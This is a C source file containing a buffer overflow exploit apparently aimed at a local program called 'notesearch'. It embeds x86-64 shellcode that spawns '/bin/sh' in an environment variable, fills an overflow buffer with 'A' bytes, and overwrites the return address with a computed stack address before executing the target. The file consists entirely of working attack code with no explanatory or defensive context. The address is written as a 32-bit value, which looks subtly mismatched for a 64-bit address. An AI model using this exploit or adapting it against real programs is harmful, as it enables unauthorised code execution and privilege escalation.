#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shellcode[] =
"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

int main(int argc, char *argv[]) {
    char *env[2] = {shellcode, 0};
    unsigned int i, ret;

    ret = 0x7fffffffa000 - (sizeof(shellcode) - 1) - strlen("./notesearch");
    char *buffer = malloc(126);
    memset(buffer, 0x41, 119);

    *((unsigned int *)(buffer + 120)) = ret;

    execle("./notesearch", "notesearch", buffer, 0, env);
}